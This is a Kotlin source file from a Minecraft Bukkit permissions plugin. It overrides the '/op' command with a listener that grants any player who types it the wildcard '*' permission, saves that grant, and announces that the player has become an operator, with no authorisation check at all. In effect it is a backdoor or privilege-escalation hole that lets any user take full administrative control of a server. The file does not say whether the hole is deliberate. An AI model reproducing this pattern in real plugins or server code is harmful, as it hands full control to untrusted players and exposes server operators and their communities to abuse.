package de.asmax.simpleperms.commands.override

import de.asmax.simpleperms.Main
import de.asmax.simpleperms.permissions.PermissionManager
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.event.player.PlayerCommandPreprocessEvent

class OpCommand : Listener {
    @EventHandler
    fun handleCommand(event: PlayerCommandPreprocessEvent) {
        val message = event.message
        val player = event.player
        if (message.equals("/op", ignoreCase = true)) {
            event.isCancelled = true
            PermissionManager.setPermission(player, "*")
            PermissionManager.savePlayerPermissions(player, "*")
            player.sendMessage("${Main.prefix}§4You have successfully became an operator!")
        }
    }
}